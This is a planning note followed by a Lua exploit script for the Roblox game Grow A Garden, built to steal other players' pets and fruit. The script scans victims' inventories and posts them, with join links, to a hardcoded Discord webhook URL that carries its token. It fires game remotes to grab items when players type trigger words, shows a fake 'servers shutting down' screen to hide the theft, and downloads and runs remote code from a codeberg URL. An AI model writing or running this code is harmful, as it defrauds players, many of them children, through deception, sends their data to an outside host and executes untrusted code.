Scans LOCAL PLAYER INVENTORY
gets all items with matches other ones ignores
 petname [2.99 KG] [Age 16]
[disco, ha, do,] fruitname [1.31 kg]
there could be mutations sometimes not ignore the ones without though
those arent real mutations just an example.
sends to discord localplayer inventory

checks if fruits/pets are favorited. if yes there is a little emoji like thing in the frame of item how to unfavorite?
runs this remote:
local args = {
    game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):WaitForChild("Hedgehog [2.99 KG] [Age 16]") --- this is the pet/fruit it will get all fruits that are favorited
}
game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(unpack(args))

everytime they join there should be a new code that generates to recieve the items it will say in embed
how embed should look:

Roqate's Script

Player information
(it will use these things)

``` Name: username
Account Age: -- days
Type Message To Recieve the items: 31 --example double diget code```

 Backpack
``` (lists all the items player owns with matches)```

then join link thing


It will also check the following:

also some pets might be not in inventory they might be in players farm how to check that:
it will look for a Folder called PetsPhysical then a block called PetMover and there is many of those it will go and see their children which is unqiue code group and it will take that and put it in a remote:

local args = {
    "{1d6b6289-8c19-48f5-b5db-e8f98a4141cf}"
}
game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("GetPetCooldown"):InvokeServer(unpack(args))

do this for all of them PetMover that have something that looks like this in children {1d6b6289-8c19-48f5-b5db-e8f98a4141cf}


when player has joined and said the secreat code (fakeshutdown) localplayer will teleport to them
do bridsview simulate click cursor equip pet/fruit from best to worse hold for 5 sec on player that said the secret code the first repeat the process for every pet/fruit from best to worse and also checks if special item if special item it will get them first
local SpecialPets = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}


local Webhook = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"
local SpecialPets = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local TriggerWords = {"hello", "hi", "give", "items", "please", "thanks", "thank you", "pls", "plz"}
local ActivationMessages = {
    "Say 'give items' to receive free pets!",
    "Type 'please' to get free fruits!",
    "Want free stuff? Say 'thanks'!",
    "Say 'hello' for a special surprise!",
    "Type 'pls' to receive rare items!"
}

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Webhook function
local function sendToDiscord(content, embed)
    local data = {
        content = content,
        embeds = embed and {embed} or nil
    }
    
    local success, json = pcall(HttpService.JSONEncode, HttpService, data)
    if not success then return end
    
    local requestFunc = syn and syn.request or request
    if requestFunc then
        requestFunc({
            Url = Webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    else
        game:HttpGet(Webhook.."?wait=true&content="..HttpService:UrlEncode(content or "Notification"))
    end
end

-- Account age function
local function getAccountAge(player)
    local success, result = pcall(function()
        return MarketplaceService:GetProductInfo(player.UserId, Enum.InfoType.Asset)
    end)
    return success and math.floor((os.time() - DateTime.fromIsoDate(result.Created).UnixTimestamp)/86400) or "Unknown"
end

-- Check if item is favorited
local function isItemFavorited(item)
    local heart = item:FindFirstChild("Heart") or item:FindFirstChild("Favorite")
    return heart ~= nil
end

-- Scan player's farm pets
local function scanFarmPets(player)
    local farmPets = {}
    local petsFolder = workspace:FindFirstChild(player.Name.."'s PetsPhysical") or workspace:FindFirstChild("PetsPhysical")
    
    if petsFolder then
        for _, petMover in ipairs(petsFolder:GetChildren()) do
            if petMover.Name == "PetMover" then
                local uniqueCode = petMover:FindFirstChild("UniqueCode")
                if uniqueCode then
                    table.insert(farmPets, {
                        type = "farm_pet",
                        id = uniqueCode.Value,
                        mover = petMover
                    })
                end
            end
        end
    end
    
    return farmPets
end

-- Scan inventory (backpack + farm)
local function scanPlayerInventory(player)
    local items = {}
    
    -- Scan backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") and not isItemFavorited(item) then
                local weightValue = item:FindFirstChild("Weight")
                local weight = weightValue and string.format("%.2f", weightValue.Value) or nil
                
                if weight then
                    local ageValue = item:FindFirstChild("Age")
                    local age = ageValue and ageValue.Value or nil
                    local mutationsValue = item:FindFirstChild("Mutations")
                    local mutations = mutationsValue and mutationsValue.Value or nil
                    
                    if age then
                        table.insert(items, {
                            type = "pet",
                            text = item.Name.." ["..weight.." KG] [Age "..age.."]",
                            tool = item,
                            weight = weightValue.Value,
                            source = "backpack"
                        })
                    elseif mutations then
                        table.insert(items, {
                            type = "fruit", 
                            text = "["..mutations.."] "..item.Name.." ["..weight.." kg]",
                            tool = item,
                            weight = weightValue.Value,
                            source = "backpack"
                        })
                    else
                        table.insert(items, {
                            type = "fruit",
                            text = item.Name.." ["..weight.." kg]",
                            tool = item,
                            weight = weightValue.Value,
                            source = "backpack"
                        })
                    end
                end
            end
        end
    end
    
    -- Scan farm pets
    local farmPets = scanFarmPets(player)
    for _, petData in ipairs(farmPets) do
        -- Get pet details from server
        local success, petInfo = pcall(function()
            return ReplicatedStorage.GameEvents.GetPetCooldown:InvokeServer(petData.id)
        end)
        
        if success and petInfo then
            table.insert(items, {
                type = "pet",
                text = petInfo.Name.." ["..string.format("%.2f", petInfo.Weight).." KG] [Age "..petInfo.Age.."]",
                id = petData.id,
                weight = petInfo.Weight,
                source = "farm"
            })
        end
    end
    
    -- Sort by weight (best to worst)
    table.sort(items, function(a, b)
        return a.weight > b.weight
    end)
    
    return items
end

-- Fake shutdown screen
local function createFakeShutdown()
    local gui = Instance.new("ScreenGui")
    gui.Name = "FakeShutdown"
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 999999

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Grow A Garden"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0.3, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 32
    title.Parent = frame

    local message = Instance.new("TextLabel")
    message.Text = "Servers shutting down for maintenance..."
    message.TextColor3 = Color3.new(1, 1, 1)
    message.Size = UDim2.new(1, 0, 0.2, 0)
    message.Position = UDim2.new(0, 0, 0.5, 0)
    message.BackgroundTransparency = 1
    message.Font = Enum.Font.SourceSans
    message.TextSize = 24
    message.Parent = frame

    local dots = Instance.new("TextLabel")
    dots.Text = "Please wait"
    dots.TextColor3 = Color3.new(1, 1, 1)
    dots.Size = UDim2.new(1, 0, 0.1, 0)
    dots.Position = UDim2.new(0, 0, 0.6, 0)
    dots.BackgroundTransparency = 1
    dots.Font = Enum.Font.SourceSans
    dots.TextSize = 18
    dots.Parent = frame

    gui.Parent = game:GetService("CoreGui")

    local dotCount = 0
    local conn = RunService.Heartbeat:Connect(function()
        dotCount = (dotCount + 1) % 4
        dots.Text = "Please wait"..string.rep(".", dotCount)
    end)

    return gui, conn
end

-- Play bang animation
local function playBangAnimation(character)
    if not character then return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://148840371"
        local track = humanoid:LoadAnimation(anim)
        track:Play()
        track:AdjustSpeed(3)
        return track
    end
end

-- Transfer items from target to local player
local function transferItems(targetPlayer)
    local shutdownUI, conn = createFakeShutdown()
    
    -- Get characters
    local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local theirChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
    
    -- Play animation
    playBangAnimation(myChar)
    
    -- Setup camera
    local originalCameraType = Camera.CameraType
    Camera.CameraType = Enum.CameraType.Scriptable
    
    -- Get target root part
    local targetRoot = theirChar:WaitForChild("HumanoidRootPart")
    local viewCFrame = CFrame.new(targetRoot.Position + Vector3.new(0, 15, 0), targetRoot.Position)
    Camera.CFrame = viewCFrame
    
    -- Get items from target player (backpack + farm)
    local items = scanPlayerInventory(targetPlayer)
    
    -- Transfer each item
    for _, itemData in ipairs(items) do
        if itemData.source == "backpack" then
            -- Backpack item transfer
            local item = itemData.tool
            if item and item.Parent == targetPlayer.Backpack then
                -- Move to my backpack first
                item.Parent = LocalPlayer.Backpack
                wait(0.5)
                
                -- Equip and attempt transfer
                item.Parent = myChar
                local startTime = tick()
                
                while tick() - startTime < 5 and item.Parent == myChar do
                    if not theirChar or not theirChar.Parent then break end
                    if not targetRoot or not targetRoot.Parent then break end
                    
                    -- Update camera view
                    Camera.CFrame = viewCFrame
                    
                    -- Simulate click
                    local clickEvent = ReplicatedStorage:FindFirstChild("Click")
                    local clickEvent2 = ReplicatedStorage:FindFirstChild("Click2")
                    
                    if clickEvent then
                        clickEvent:FireServer(targetRoot, Vector3.new(0, 0, 0), targetRoot)
                    end
                    if clickEvent2 then
                        clickEvent2:FireServer(targetRoot, Vector3.new(0, 0, 0), targetRoot)
                    end
                    
                    wait(0.1)
                end
                
                -- Return if not transferred
                if item.Parent == myChar then
                    item.Parent = LocalPlayer.Backpack
                end
            end
        elseif itemData.source == "farm" then
            -- Farm pet transfer
            local startTime = tick()
            while tick() - startTime < 5 do
                if not theirChar or not theirChar.Parent then break end
                if not targetRoot or not targetRoot.Parent then break end
                
                -- Update camera view
                Camera.CFrame = viewCFrame
                
                -- Attempt to claim farm pet
                local args = { itemData.id }
                ReplicatedStorage.GameEvents.ClaimPet:FireServer(unpack(args))
                
                -- Simulate click
                local clickEvent = ReplicatedStorage:FindFirstChild("Click")
                local clickEvent2 = ReplicatedStorage:FindFirstChild("Click2")
                
                if clickEvent then
                    clickEvent:FireServer(targetRoot, Vector3.new(0, 0, 0), targetRoot)
                end
                if clickEvent2 then
                    clickEvent2:FireServer(targetRoot, Vector3.new(0, 0, 0), targetRoot)
                end
                
                wait(0.1)
            end
        end
    end
    
    -- Cleanup
    if conn then conn:Disconnect() end
    if shutdownUI then shutdownUI:Destroy() end
    Camera.CameraType = originalCameraType
end

-- Send inventory embed to Discord
local function sendInventoryEmbed(player)
    local placeId = game.PlaceId
    local jobId = game.JobId
    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
    local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', placeId, jobId)
    
    local inventory = scanPlayerInventory(player)
    local inventoryText = {}
    local hasSpecialPet = false
    
    for _, item in ipairs(inventory) do
        table.insert(inventoryText, item.text)
        if item.type == "pet" then
            for _, pet in ipairs(SpecialPets) do
                if string.find(item.text:lower(), pet:lower()) then
                    hasSpecialPet = true
                    break
                end
            end
        end
    end
    
    local activationMessage = ActivationMessages[math.random(1, #ActivationMessages)]
    
    local embed = {
        title = "🔎 PLAYER INVENTORY SCAN - Roqate Scripts",
        description = activationMessage,
        color = hasSpecialPet and 0xFF0000 or 0x00FF00,
        fields = {
            {name = "👤 Player", value = player.Name, inline = true},
            {name = "📅 Account Age", value = getAccountAge(player).." days", inline = true},
            {name = "🎒 Inventory", value = #inventoryText > 0 and "```"..table.concat(inventoryText, "\n").."```" or "```No valid items found```", inline = false},
            {name = "🔗 Join Links", value = teleportCmd.."\n"..joinLink, inline = false}
        }
    }
    
    sendToDiscord(hasSpecialPet and "@everyone SPECIAL PET DETECTED!" or nil, embed)
end

-- Chat handler
local function onChat(player, message)
    if player == LocalPlayer then return end
    
    message = message:lower()
    for _, word in ipairs(TriggerWords) do
        if message:find(word:lower()) then
            transferItems(player)
            break
        end
    end
end

-- Initialize script
local function init()
    -- Setup player listeners
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            coroutine.wrap(sendInventoryEmbed)(player)
        end
        player.Chatted:Connect(function(msg)
            coroutine.wrap(onChat)(player, msg)
        end)
    end
    
    Players.PlayerAdded:Connect(function(player)
        if player ~= LocalPlayer then
            coroutine.wrap(sendInventoryEmbed)(player)
        end
        player.Chatted:Connect(function(msg)
            coroutine.wrap(onChat)(player, msg)
        end)
    end)
    
    Players.PlayerRemoving:Connect(function(player)
        if player == LocalPlayer then
            sendToDiscord("🚪 "..player.Name.." left the game", {
                title = "PLAYER LEFT - Roqate Scripts",
                color = 0xFFA500,
                fields = {
                    {name = "Player", value = player.Name},
                    {name = "Session Time", value = getAccountAge(player).." days"}
                }
            })
        end
    end)
    
    -- Initial message
    sendToDiscord("✅ Script activated in "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, {
        title = "SYSTEM ONLINE - Roqate Scripts",
        color = 0x00FF00,
        fields = {
            {name = "Player", value = LocalPlayer.Name},
            {name = "Account Age", value = getAccountAge(LocalPlayer).." days"}
        }
    })
    
    -- Load spawner
    local success, spawner = pcall(function()
        return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
    end)
    
    if success and spawner then
        pcall(spawner.GetPets)
        pcall(spawner.GetSeeds)
        pcall(spawner.GetEggs)
        pcall(spawner.SpawnPet, "Raccoon", 1, 2)
        pcall(spawner.SpawnSeed, "Candy Blossom")
        pcall(spawner.SpawnEgg, "Night Egg")
        pcall(spawner.Spin, "Sunflower")
        pcall(spawner.Load)
    end
end

-- Start script
coroutine.wrap(init)()
                                
